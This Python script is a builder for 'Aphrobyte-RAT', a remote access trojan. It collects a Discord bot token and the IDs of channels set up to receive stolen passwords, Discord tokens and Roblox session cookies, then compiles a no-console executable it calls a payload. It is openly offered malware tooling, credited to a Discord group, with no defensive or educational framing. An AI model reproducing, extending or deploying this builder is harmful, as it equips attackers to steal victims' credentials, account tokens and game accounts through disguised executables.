import sys, os, shutil
try:
    from termcolor import colored
    import colorama
    from colorama import Fore
    from pystyle import Colors, Colorate, Center
except:
    os.system("pip install termcolor")
    os.system("pip install colorama")
    os.system("pip install pystyle")
    from termcolor import colored
    import colorama
    from colorama import Fore
    from pystyle import Colors, Colorate, Center

colorama.init()

####################################################

samplefile = ".buildmodules\sample.py"

class Builder:
    def __init__(self,token,guild_id,announc,passw,tokens,roblosec):
        self.token = token
        self.guild_id = guild_id
        self.announc = announc
        self.passw = passw
        self.tokens = tokens
        self.roblosec = roblosec

        f = open(".buildmodules\main.py", 'r')
        file = f.read()
        f.close()

        newfile = file.replace("{token}", self.token)
        newfile = newfile.replace("{guild_id}", self.guild_id)
        newfile = newfile.replace("{announc}", self.announc)
        newfile = newfile.replace("{passw}", self.passw)
        newfile = newfile.replace("{tokens}", self.tokens)
        newfile = newfile.replace("{roblosec}", self.roblosec)

        f = open(".buildmodules\main.py", 'w')
        f.write(newfile)
        f.close()
    def build(self):
        os.system("""
python -m PyInstaller --onefile --noconsole --name="Client-built" --icon=".buildmodules\exeic.ico" ".buildmodules\main.py"
""")


####################################################


def pause():
    os.system("pause")  
def clear():
    os.system("cls")    

def printart():
    ascii_art = """

░█████╗░██████╗░██╗░░██╗██████╗░░█████╗░██████╗░██╗░░░██╗████████╗███████╗
██╔══██╗██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝
███████║██████╔╝███████║██████╔╝██║░░██║██████╦╝░╚████╔╝░░░░██║░░░█████╗░░
██╔══██║██╔═══╝░██╔══██║██╔══██╗██║░░██║██╔══██╗░░╚██╔╝░░░░░██║░░░██╔══╝░░
██║░░██║██║░░░░░██║░░██║██║░░██║╚█████╔╝██████╦╝░░░██║░░░░░░██║░░░███████╗
╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░╚══════╝
""" 

    creds = """
    ╔═══════════════════════════════════════╗
    ╬ Created by RIOT Administration        ╬
    ╬ Invite: https://discord.gg/4TyqkDXtBa ╬
    ╚═══════════════════════════════════════╝
    """

    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(ascii_art)))
    print(Colorate.Vertical(Colors.blue_to_purple, Center.XCenter(creds)))


clear()
os.system("""title "Aphrobyte-RAT Builder | Warning | Unlicensed"
""")
print(colored("""WARNING: Enable Developer Mode on Discord first. Look on YouTube if you don't know something.""", 'red'))
print(colored("""WARNING: Your Discord bot should have all privileged gateway intents enabled. If you don't know how to enable them, look on YouTube.""", 'red'))   
pause()
clear()
os.system("""title "Aphrobyte-RAT Builder | Configuration | Unlicensed"
""")
printart()
print("")   
token = input("Bot token : ")
guildid = input("Server ID : ")
annc = input("Notification channel ID : ")
passw = input("Passwords channel ID to receive passwords : ")
tokens = input("Tokens channel ID to receive tokens : ")
roblosecurity = input("Roblosecurity channel ID to receive Roblox cookies : ")  
print("")
clear()
print(f"""
{Fore.BLUE}Bot token : {token}
{Fore.BLUE}Guild ID : {guildid}
{Fore.BLUE}Notifications channel ID : {annc}
{Fore.BLUE}Passwords channel ID : {passw}
{Fore.BLUE}Tokens channel ID : {tokens}
{Fore.BLUE}Roblosecurity channel ID : {roblosecurity}

""")
prompt = input(f"{Fore.BLUE}Is this correct? (y/n)")
if prompt.lower() == "y":
    pass
elif prompt.lower() == "n":
    exit()
os.system("""title "Aphrobyte-RAT Builder | Compiling | Unlicensed"
""")
clear()
print(colored("Started compiling Aphrobyte-RAT configuration...", 'green'))
shutil.copy(samplefile, ".buildmodules\main.py")
builder = Builder(token=token,guild_id=guildid,announc=annc,passw=passw,tokens=tokens,roblosec=roblosecurity)
builder.build()
print("")
print(colored("""
Your payload has been successfully created. It has been named to "Client-built.exe" and can be used as a standalone.
""", 'green'))
shutil.copy("dist\\Client-built.exe", "Client-built.exe")
os.remove(".buildmodules\main.py")
shutil.rmtree("dist")
shutil.rmtree("build")
os.remove("Client-built.spec")
os.system("""title "Aphrobyte-RAT Builder | Built | Unlicensed"
""")
pause()